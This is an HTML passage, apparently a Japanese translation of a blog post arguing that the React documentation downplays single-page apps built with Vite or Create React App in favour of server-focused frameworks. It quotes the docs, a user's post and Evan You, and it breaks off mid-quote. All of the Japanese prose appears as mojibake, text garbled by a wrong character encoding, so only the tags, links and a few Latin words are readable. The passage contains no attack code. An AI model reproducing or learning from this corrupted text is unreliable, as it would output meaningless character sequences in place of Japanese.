<p>ã€Œã‚ˆã‚Šé€Ÿã„åˆæœŸãƒšãƒ¼ã‚¸ãƒ­ãƒ¼ãƒ‰ã€ã€ã€Œã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®JSã‚’å°‘ãªãã™ã‚‹ã€ã€ã€Œã‚¦ã‚©ãƒ¼ã‚¿ãƒ¼ãƒ•ã‚©ãƒ¼ãƒ«ã‚’é¿ã‘ã‚‹ã€ã¨ã„ã£ãŸSSRã®æ­£å½“åŒ–ã¯ã€å…¨ã¦ç†ã«ã‹ãªã£ã¦ã„ã¾ã™ã€‚ç§ã‚‚ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã®SPAãŒãŠãã‚‰ãä½¿ã‚ã‚Œã‚‹ã¹ãã§ãªã‹ã£ãŸå¤šãã®å ´æ‰€ã§ä½¿ç”¨ã•ã‚Œã¦ããŸã“ã¨ï¼ˆReduxã¨æœ¬å½“ã«åŒã˜ã§ã™ï¼‰ã€ãã—ã¦ã€ãŸã¨ãˆã™ãã«å…¨ã¦ã®æ©Ÿèƒ½ãŒå¿…è¦ã§ãªãã¦ã‚‚ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‹ã‚‰å§‹ã‚ã‚‹ã“ã¨ãŒç†ã«ã‹ãªã£ã¦ã„ã‚‹ã“ã¨ã€ãã†ã™ã‚Œã°å¾Œã§ãã‚Œã‚‰ã®æ©Ÿèƒ½ãŒå¿…è¦ã«ãªã£ãŸã¨ãã«åˆ©ç”¨ã§ãã‚‹ã¨ã„ã†ã“ã¨ã«åŒæ„ã—ã¾ã™ã€‚</p>
<p>Nextã¨Remixã«ã¯ã€é™çš„ãªJS/HTMLã‚¢ã‚»ãƒƒãƒˆã‚’å‡ºåŠ›ã™ã‚‹ã ã‘ã®<a href="https://nextjs.org/docs/pages/building-your-application/deploying/static-exports">ã€ŒSPA / ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆã€ãƒ¢ãƒ¼ãƒ‰</a>ãŒã‚ã‚‹ã®ã§ã€ãã‚Œã‚‰ã‚’ä½¿ã£ã¦Nodeã‚µãƒ¼ãƒãƒ¼ãƒ—ãƒ­ã‚»ã‚¹ã‚’å¿…è¦ã¨ã—ãªã„ç´”ç²‹ãªã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã‚¢ãƒ—ãƒªã‚’ä½œæˆã™ã‚‹ã“ã¨ã¯å¯èƒ½ã§ã™ã€‚ã—ã‹ã—ã€ãã‚Œã‚‰ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ãªãã€ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã®ã»ã¨ã‚“ã©ãŒãã‚ŒãŒã‚ªãƒ—ã‚·ãƒ§ãƒ³ã§ã‚ã‚‹ã“ã¨ã™ã‚‰çŸ¥ã‚‰ãªã„ã ã‚ã†ã¨ç§ã¯æ¨æ¸¬ã—ã¾ã™ã€‚</p>
<h3>ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯æ¨å¥¨ã«ã¯ãƒ‹ãƒ¥ã‚¢ãƒ³ã‚¹ãŒæ¬ ã‘ã¦ã„ã‚‹</h3>
<p>ã“ã‚Œã‚‰å…¨ã¦ã‚’è¸ã¾ãˆã¦ã€ç§ã¯Reactãƒãƒ¼ãƒ ãŒãªãœãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã¨ã—ã¦ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’æ¨å¥¨ã™ã‚‹ã“ã¨ã«æ±ºã‚ãŸã®ã‹ã‚’ç†è§£ã—ã¦ã„ã¾ã™ã€‚ãã‚Œã¯åˆç†çš„ãªæ„è¦‹ã§ã‚ã‚Šã€å¹³å‡çš„ãªReactã‚¢ãƒ—ãƒªã‚’æ”¹å–„ã™ã‚‹ãŸã‚ã®æ­£å½“ãªæ„å›³ã ã¨æ€ã„ã¾ã™ã€‚</p>
<p>ã—ã‹ã—ã€ç§ã¯ã¾ãŸã€ãã®ã€Œæ¨å¥¨ã€ãŒã€ã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ å…¨ä½“ã§ReactãŒå®Ÿéš›ã«ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å¤šæ§˜ãªæ–¹æ³•ã‚’å……åˆ†ã«è©•ä¾¡ã—ãªã„ã€éåº¦ã«åºƒç¯„ãªå‡¦æ–¹ç®‹ã«å¤‰ã‚ã£ã¦ã—ã¾ã£ãŸã¨æ„Ÿã˜ã¦ã„ã¾ã™ã€‚</p>
<p>ãƒ•ãƒ«ã‚¹ã‚¿ãƒƒã‚¯ã®Reactãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’ä½¿ç”¨ã™ã‚‹å¤šãã®æ­£å½“ãªç†ç”±ãŒã‚ã‚Šã¾ã™ãŒã€ä½¿ç”¨ã—ãªã„ç†ç”±ã‚‚ãŸãã•ã‚“ã‚ã‚Šã¾ã™ï¼š</p>
<ul>
<li>ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¯å¤šãã®è¿½åŠ æ©Ÿèƒ½ã‚’è¿½åŠ ã—ã¾ã™ãŒã€ãã‚Œã¯å­¦ç¿’ã™ã‚‹è¤‡é›‘ã•ã‚‚è¿½åŠ ã—ã€Reactã®ä½¿ã„æ–¹ã‚’æŠŠæ¡ã—ã‚ˆã†ã¨ã—ã¦ã„ã‚‹åˆå¿ƒè€…ã«ã¯ã‚ã¾ã‚Šé©ã—ã¦ã„ã¾ã›ã‚“ã€‚</li>
<li>è¿½åŠ ã•ã‚ŒãŸè¤‡é›‘ã•ã¯ã€èª¤ã£ã¦ã‚µãƒ¼ãƒãƒ¼ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã§Contextã‚„ãƒ•ãƒƒã‚¯ã‚’ä½¿ç”¨ã—ã¦ã—ã¾ã†ï¼ˆã‚¨ãƒ©ãƒ¼ã‚’ã‚¹ãƒ­ãƒ¼ã™ã‚‹ï¼‰ãªã©ã€æ··ä¹±ã«ã¤ãªãŒã‚‹ç½ ã«ã‚‚ãªã‚Šå¾—ã¾ã™ã€‚</li>
<li>å¤šãã®ä¼æ¥­ã¯JSãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã‚’é‹ç”¨ã—ã¦ã„ãªã„ã‹ã‚‚ã—ã‚Œãšã€ãã‚Œã«å¯¾ã™ã‚‹è¦å‰‡ã‚„åˆ¶é™ã•ãˆã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚</li>
<li>ã‚µãƒ¼ãƒãƒ¼æ©Ÿèƒ½ã‚’æŒã¤ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¯å®Ÿè¡Œã«ç‰¹å®šã®ãƒ›ã‚¹ãƒ†ã‚£ãƒ³ã‚°ã‚’å¿…è¦ã¨ã—ã¾ã™ãŒã€ç´”ç²‹ãªSPAã¯é™çš„ãªHTMLã¨JSã‚’æä¾›ã™ã‚‹å ´æ‰€ãªã‚‰ã©ã“ã§ã‚‚ï¼ˆGithub Pagesã‚„Amazon S3ã‚’å«ã‚€ï¼‰ç°¡å˜ã«ãƒ›ã‚¹ãƒˆã§ãã¾ã™ã€‚</li>
<li>ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’é¸ã³å‡ºã™å¿…è¦æ€§ã¯ã€ã—ã°ã—ã°Reactãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã¨ã£ã¦ä¸æº€ã®æºã§ã—ãŸãŒã€ãã‚Œã¯ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’ç‰¹å®šã®ãƒ‹ãƒ¼ã‚ºã«åˆã‚ã›ã¦ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚æ„è¦‹ã®å¼·ã„ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¯ã€ãã‚Œã‚‰ã®æ±ºå®šã®ã»ã¨ã‚“ã©ã‚’è¡Œã†å¿…è¦æ€§ã‚’ãªãã—ã¾ã™ãŒã€å¾Œã§æŒ™å‹•ã‚’ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºã™ã‚‹èƒ½åŠ›ã‚’åˆ¶é™ã™ã‚‹ã“ã¨ã‚‚ã‚ã‚Šã¾ã™ã€‚</li>
<li>ã€Œã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã€ã¸ã®é‡ç‚¹åŒ–ã¯ã€ä¸€éƒ¨ã®ç¨®é¡ã®ã‚¢ãƒ—ãƒªã«ã¯æ˜ã‚‰ã‹ã«å½¹ç«‹ã¡ã¾ã™ãŒã€å…¨ã¦ã§ã¯ã‚ã‚Šã¾ã›ã‚“ - ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã ã‘ã§ç”Ÿãã‚‹å¿…è¦ãŒã‚ã‚‹ã‚¢ãƒ—ãƒªã‚‚ãŸãã•ã‚“ã‚ã‚Šã¾ã™ã€‚</li>
</ul>
<h3>ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã®æ¨å¥¨äº‹é …ã¯é‡è¦</h3>
<p>Reactãƒãƒ¼ãƒ ã¯ã€Œãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã¯åˆå¿ƒè€…ã‚’å¯¾è±¡ã¨ã—ã¦ã„ã‚‹ã€ã¨è¿°ã¹ã¦ãŠã‚Šã€ãã®ãŸã‚æ¨å¥¨ã•ã‚Œã‚‹ãƒ„ãƒ¼ãƒ«ã‚„ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã®ãƒªã‚¹ãƒˆã‚’æ··ä¹±ã‚’é¿ã‘ã‚‹ãŸã‚ã«ã‹ãªã‚Šã‚·ãƒ³ãƒ—ãƒ«ã«ä¿ã¡ãŸã„ã¨è€ƒãˆã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯éå¸¸ã«åˆç†çš„ãªã‚¹ã‚¿ãƒ³ã‚¹ã§ã™ã€‚</p>
<p>å½¼ã‚‰ã¯ã¾ãŸã€ã€ŒViteã‚’ä½¿ã†ã¹ãã ã¨çŸ¥ã£ã¦ã„ã‚‹ã»ã©çµŒé¨“è±Šå¯Œãªäººã¯ã€ã©ã®ã¿ã¡ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã«ãã‚ŒãŒãƒªã‚¹ãƒˆã•ã‚Œã¦ã„ã‚‹ã®ã‚’è¦‹ã‚‹å¿…è¦ã¯ãªã„ã€ï¼ˆæ„è¨³ï¼‰ã¨ã‚‚è¿°ã¹ã¦ã„ã¾ã™ã€‚ãã‚Œã¯æŠ€è¡“çš„ã«ã¯çœŸå®Ÿã§ã™ã€‚</p>
<p>ã—ã‹ã—ã€ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’èª­ã‚€ã®ã¯åˆå¿ƒè€…ã ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã—ã€ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆãŒæ¨å¥¨ã™ã‚‹ã‚‚ã®ã¯å…¬å¼ã®æ‰¿èªã®å°ã¨ã—ã¦ã®å½±éŸ¿åŠ›ã‚’æŒã¡ã¾ã™ã€‚ãã‚ŒãŒã€Reactãƒãƒ¼ãƒ ãŒæ­´å²çš„ã«ç‰¹å®šã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚„æŠ€è¡“ã‚’æ¨å¥¨ã™ã‚‹ã“ã¨ã‚’é¿ã‘ã¦ããŸå¤§ããªç†ç”±ã®ä¸€éƒ¨ã§ã™ã€‚</p>
<p>ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ï¼ãƒ“ãƒ«ãƒ‰ãƒ„ãƒ¼ãƒ«ã®ä½¿ç”¨çµ±è¨ˆã‚’æŒ¯ã‚Šè¿”ã‚‹ã¨ã€ä»Šæ—¥ã€Vite Reactã¨CRAã®ä½¿ç”¨é‡ã¯Nextã‚’ä¸Šå›ã£ã¦ãŠã‚Šã€SPAã®ä½¿ç”¨ãŒä¾ç„¶ã¨ã—ã¦Reactã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã®å°‘ãªãã¨ã‚‚åŠåˆ†ã‚’å ã‚ã¦ã„ã‚‹ã“ã¨ã¯æ˜ã‚‰ã‹ã§ã™ã€‚ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã®æ¨å¥¨äº‹é …ã¯ãã®ä½¿ç”¨çŠ¶æ³ã‚’åæ˜ ã™ã¹ãã§ã™ã€‚</p>
<h3>ã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã®è»½è¦–</h3>
<p>æ–°ã—ã„Reactãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆãŒå…¬é–‹ã•ã‚ŒãŸã¨ãã€ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ä»¥å¤–ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã«ã¤ã„ã¦ã®å”¯ä¸€ã®è¨€åŠã¯ã€<a href="https://web.archive.org/web/20230318003653/https://react.dev/learn/start-a-new-react-project#can-i-use-react-without-a-framework">ã€Œãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ãªã—ã§Reactã‚’ä½¿ãˆã¾ã™ã‹ï¼Ÿã€</a>ã¨é¡Œã•ã‚ŒãŸå±•é–‹å¯èƒ½ãªè©³ç´°ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã€ã€Œã¯ã„ã€ã—ã‹ã—ç§ãŸã¡ã¯ãã‚ŒãŒè‰¯ã„è€ƒãˆã ã¨ã¯æ€ã„ã¾ã›ã‚“ã€ã¨è¿°ã¹ã‚‹ã„ãã¤ã‹ã®æ®µè½ãŒã‚ã‚Šã¾ã—ãŸã€‚</p>
<p>ãã—ã¦ã€ãã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã®æœ€å¾Œã§èªã‚‰ã‚Œã¦ã„ãŸã®ãŒã“ã¡ã‚‰ã®å£°æ˜ã§ã—ãŸï¼š</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>ãã‚Œã§ã‚‚ç´å¾—ã§ããªã„å ´åˆã€ã¾ãŸã¯ã‚ãªãŸã®ã‚¢ãƒ—ãƒªãŒã“ã‚Œã‚‰ã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã§ã¯ã†ã¾ãå¯¾å¿œã§ããªã„çã—ã„åˆ¶ç´„ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€ãã—ã¦ç‹¬è‡ªã®ã‚«ã‚¹ã‚¿ãƒ ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã‚’æ§‹ç¯‰ã—ãŸã„å ´åˆã¯ã€ç§ãŸã¡ã¯ã‚ãªãŸã‚’æ­¢ã‚ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“â€”ã©ã†ãï¼npmã‹ã‚‰reactã¨react-domã‚’å…¥æ‰‹ã—ã€Viteã‚„Parcelã®ã‚ˆã†ãªãƒãƒ³ãƒ‰ãƒ©ã§ã‚«ã‚¹ã‚¿ãƒ ãƒ“ãƒ«ãƒ‰ãƒ—ãƒ­ã‚»ã‚¹ã‚’è¨­å®šã—ã€ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã€é™çš„ç”Ÿæˆã¾ãŸã¯ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ãªã©ã®ãŸã‚ã«å¿…è¦ã«å¿œã˜ã¦ä»–ã®ãƒ„ãƒ¼ãƒ«ã‚’è¿½åŠ ã—ã¦ãã ã•ã„ã€‚</p></div></div>
<p>ã¤ã¾ã‚Šã€æ–°ã—ã„ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ãƒšãƒ¼ã‚¸ã¯Create React Appã‚’ãƒªã‚¹ãƒˆã‚¢ãƒƒãƒ—ã—ãªã‹ã£ãŸã ã‘ã§ãªãã€æœ€ã‚‚è¿‘ã„åŒç­‰ã®ãƒ„ãƒ¼ãƒ«ï¼ˆViteï¼‰ã¯ãƒšãƒ¼ã‚¸ã®å¤–éƒ¨ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§æ„å‘³ã®ã‚ã‚‹ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¨ã—ã¦ã•ãˆãƒªã‚¹ãƒˆã•ã‚Œã¦ã„ã¾ã›ã‚“ã§ã—ãŸã€‚ä»£ã‚ã‚Šã«ã€ãã‚Œã¯ã“ã®å±•é–‹å¯èƒ½ãªèª¬æ˜ã®æœ€å¾Œã«å˜ãªã‚‹è¨€åŠã¨ã—ã¦è¨˜ã•ã‚Œã¦ã„ã¾ã—ãŸã€‚</p>
<p>ã¾ãŸã€ã€Œçã—ã„åˆ¶ç´„ã€ã¨ã„ã†ãƒ•ãƒ¬ãƒ¼ã‚ºã¯ã“ã“ã§ã¯éå¸¸ã«ä¸é©åˆ‡ã ã¨è¨€ã„ãŸã„ã§ã™ã€‚SPAã¯Reactã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã§å½“åˆã‹ã‚‰æ¨™æº–çš„ãªã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã§ã—ãŸã€‚CRAã¨Viteã¯ä¸€èˆ¬çš„ã«ä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã™ã€‚SPAã‚’æ§‹ç¯‰ã™ã‚‹ã“ã¨ãŒã€ã©ã†ã—ã¦çªç„¶ã€Œçã—ã„åˆ¶ç´„ã€ã«ãªã‚‹ã®ã§ã—ã‚‡ã†ã‹ï¼Ÿã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£çš„ãªç†ç”±ã‹ã‚‰ãƒ“ã‚¸ãƒã‚¹ä¸Šã®ç†ç”±ã€å­¦ç¿’ã®å˜ç´”ã•ã¾ã§ã€SPAã‚’æœ›ã‚€ç†ç”±ã¯ãŸãã•ã‚“ã‚ã‚Šã¾ã™ã€‚ãã‚Œã‚‰ã¯ã€Œçã—ã„ã€ã‚‚ã®ã§ã¯ã‚ã‚Šã¾ã›ã‚“ - ãã‚Œã‚‰ã¯å…¨ã¦ä¸€èˆ¬çš„ãªãƒ¦ãƒ¼ã‚¹ã‚±ãƒ¼ã‚¹ã§ã™ã€‚</p>
<p>ãã—ã¦ãã‚Œã‚’è¶…ãˆã¦...ã€Œç§ãŸã¡ã¯ã‚ãªãŸã‚’æ­¢ã‚ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€ã¨ã„ã†ãƒ•ãƒ¬ãƒ¼ã‚ºã«æ³¨ç›®ã—ã¦ãã ã•ã„ã€‚ãã®ãƒ•ãƒ¬ãƒ¼ã‚ºã¯ã€å¤šãã®äººã€…ã®ç›®ã«ã€ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã‚’è»½è¦–ã™ã‚‹ä¸é©åˆ‡ãªè¡¨ç¾ã¨ã—ã¦ã€ãã—ã¦Reactãƒãƒ¼ãƒ ãŒä¸€å¤œã«ã—ã¦SPAã‚’ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ãªã„ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã¨ã—ã¦æ ¼ä¸‹ã’ã—ã¦ã„ã‚‹ã“ã¨ã®ã—ã‚‹ã—ã¨ã—ã¦æ˜ ã‚Šã¾ã—ãŸã€‚</p>
<p>ã“ã®ä¾‹ã¨ã—ã¦ã€2023å¹´åŠã°ã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã«ãŠã‘ã‚‹ã€Œãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã€é‡è¦–ã«é–¢ã™ã‚‹è­°è«–ã‹ã‚‰ã®å¼•ç”¨ã‚’ä»¥ä¸‹ã«ç¤ºã—ã¾ã™ï¼š</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p><em>ã‚ã‚‹æ„å‘³ã§ã€Reactã¯AngularJSã®ç¬é–“ã‚’è¿ãˆã¦ã„ã¾ã™ã€‚ãƒãƒ¼ãƒ ã¯ã“ã®ä¸å®‰å®šã§ä¸ç¢ºå®Ÿãªæ™‚æœŸã‚’åˆ©ç”¨ã—ã¦ã€ä»£æ›¿æ¡ˆã‚’æ¢ã—ã¦ã„ã¾ã™ã€‚ç§ãŸã¡ã¯ç¢ºã‹ã«ãã†ã§ã™ã€‚
Reactã¯ç´ æ™´ã‚‰ã—ã„ã§ã™ã€‚ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã«ã¨ã£ã¦æ‡¸å¿µãªã®ã¯ã€ã‚µãƒ¼ãƒãƒ¼ï¼†ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¸ã®å¼·ã„åŒèª¿ã¨ã„ã†ãƒˆãƒ¼ãƒ³ã®å¤‰åŒ–ã§ã™ã€‚ä»Šæ—¥ã‚ã‚‹å§¿ã«ã—ãŸã‚µãƒ¼ãƒãƒ¼ãƒ‹ãƒ¥ãƒ¼ãƒˆãƒ©ãƒ«ãªå´é¢ãŒã€çªç„¶äºŒæµã«æ„Ÿã˜ã‚‰ã‚Œã¾ã™ã€‚ï¼ˆSPAã®ãƒ«ãƒ¼ã‚¿ãƒ¼ï¼†ãƒ­ãƒ¼ãƒ€ãƒ¼ã¯æ··ä¹±ã—ã¦ãŠã‚Šã€ååˆ†ãªã‚µãƒ¼ãƒ“ã‚¹ãŒæä¾›ã•ã‚Œã¦ã„ã¾ã›ã‚“ï¼ï¼‰
ãã‚Œã¯Reactã‚„Viteã«ã¤ã„ã¦ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã«ã¤ã„ã¦ã§ã™ã€‚ReactãŒä¼çµ±çš„ãªã€Œéãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã€ã‚’ã€Œæ–°ã—ã„æ–¹æ³•ã€ã»ã©å¼·ãå¥¨åŠ±ã—ãªã„ã“ã¨ã«æ°—ã¥ãã®ã¯è¾›ã„ã§ã™ã€‚ã€Œãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ãªã—ã®Reactã€ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã¯ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã«éš ã•ã‚Œã¦ãŠã‚Šã€æ†‚é¬±ã§ã™ã€‚
Nodeä»¥å¤–ã®ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã‚’æŒã¤ä¼æ¥­ã¨ã—ã¦ã€ç§ãŸã¡ã¯ãã‚Œã‚‰ã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’ã€ã‚‚ã¯ã‚„Reactã®ä¸»è¦ãªæ–¹å‘æ€§ã¨ä¸€è‡´ã—ãªã„ã¨ã„ã†ã‚µã‚¤ãƒ³ã¨è¦‹ã¦ã„ã¾ã™ã€‚ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã®æ”¯æŒã¯ã€ãƒãƒ¼ãƒ ã«ã‚¹ã‚¿ãƒƒã‚¯å…¨ä½“ã‚’å†è©•ä¾¡ã•ã›ã‚‹ã»ã©ã®å¤§ããªå¤‰åŒ–ã§ã™ã€‚Reactã¯ç´ æ™´ã‚‰ã—ã„ã§ã™ãŒã€ãã®å½±éŸ¿åŠ›ã¯ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã«é™ç•ŒãŒã‚ã‚Šã¾ã™ã€‚ReactãŒã“ã®æ–¹å‘ã«è¡Œãã“ã¨ãŒã€Œé–“é•ã£ã¦ã„ã‚‹ã€ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã—ã‹ã—ã€éãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã®Reactã®ä½¿ç”¨ãŒä»Šã‚„äºŒæµã®æ‡¸å¿µäº‹é …ã§ã‚ã‚‹ã¨å½ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ãã‚ŒãŒå®Ÿè¡Œä¸å¯èƒ½ãªé¸æŠè‚¢ã«ãªã‚‹ã¾ã§ã€ã‚ã¨ã©ã‚Œãã‚‰ã„ã§ã—ã‚‡ã†ã‹ï¼Ÿãã‚Œã¯ä¸å¿«ã§ã™ã€‚ã ã‹ã‚‰ã€ç§ãŸã¡ã¯ã‚ˆã‚Šå®‰å…¨ãªè³­ã‘ã‚’æ¢ã—ã¾ã™ã€‚Nodeä»¥å¤–ã®ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã‚’æŒã¤ä¼æ¥­ã«ä½•ã‚’å‹§ã‚ã¾ã™ã‹ï¼Ÿ <a href="https://x.com/vyrotek/status/1649097699696992256">https://x.com/vyrotek/status/1649097699696992256</a></em></p></div></div>
<h3>ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã®æ¨å¥¨äº‹é …ã®ä¿®æ­£</h3>
<p>Reactãƒãƒ¼ãƒ ãŒæœ€çµ‚çš„ã«<a href="https://react.dev/blog/2025/02/14/sunsetting-create-react-app">2025å¹´åˆé ­ã«CRAã‚’éæ¨å¥¨ã¨ç™ºè¡¨</a>ã—ãŸã¨ãï¼ˆç§ãŒãã‚Œã‚’ä¿®æ­£ã—ã€ãã®éæ¨å¥¨ã‚’å…¬å¼ã«ã™ã‚‹ã‚ˆã†ã«å½¼ã‚‰ã‚’å¾ŒæŠ¼ã—ã—ãŸå¾Œï¼‰ã€<a href="https://github.com/reactjs/react.dev/pull/7495">æœ€åˆã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆæ›´æ–°</a>ã«ã¯æ–°ã—ã„ã€Œç‹¬è‡ªã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’æ§‹ç¯‰ã™ã‚‹ã€ãƒšãƒ¼ã‚¸ãŒå«ã¾ã‚Œã¦ã„ã¾ã—ãŸã€‚ãã®ã‚³ãƒ³ã‚»ãƒ—ãƒˆã¯ã€ç‹¬è‡ªã®ãƒ«ãƒ¼ã‚¿ãƒ¼ã¨ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã‚’é¸ã¶ã“ã¨ã¯ã€ã€Œæœ¬ç‰©ã®ã€ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã»ã©è‰¯ããªã„ç‰¹æ³¨ã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’å¯„ã›é›†ã‚ã‚‹ã“ã¨ã¨åŒç­‰ã§ã‚ã‚‹ã€ã¨ã„ã†ã‚‚ã®ã§ã—ãŸã€‚</p>
<p>ã“ã“ã§ã®ãƒ¡ãƒ³ã‚¿ãƒ«ãƒ¢ãƒ‡ãƒ«ã¯ç†è§£ã§ãã¾ã™ãŒã€ã“ã‚Œã‚‚ã¾ãŸã€ã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ãŒã‚¢ãƒ—ãƒªã‚’æ§‹ç¯‰ã—ã¦ããŸæ–¹æ³•ã¨ã€äººã€…ãŒç‹¬è‡ªã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’é¸æŠã™ã‚‹èƒ½åŠ›ã®ä¸¡æ–¹ã‚’ã‹ãªã‚Šè»½è¦–ã—ã¦ã„ã¾ã™ã€‚</p>
<p>ä¸€ä¾‹ã¨ã—ã¦ã€Viteã®ä½œè€…ã§ã‚ã‚‹<a href="https://x.com/youyuxi/status/1892000761778929931">Evan Youã¯å½¼ã®è¦‹è§£ã‚’æŠ•ç¨¿</a>ã—ã¾ã—ãŸï¼š</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>Reactãƒãƒ¼ãƒ ã®Viteï¼ˆãŠã‚ˆã³ãƒ“ãƒ«ãƒ‰ãƒ„ãƒ¼ãƒ«å…¨èˆ¬ï¼‰ã«å¯¾ã™ã‚‹ãŸã‚ã‚‰ã„ã¯ã€ãã‚ŒãŒå½¼ã‚‰ã®Reactã®ãƒ“ã‚¸ãƒ§ãƒ³ï¼ˆã¤ã¾ã‚Šã€RSCãŒæ¨å¥¨ã•ã‚Œã‚‹ãƒ‘ãƒ©ãƒ€ã‚¤ãƒ 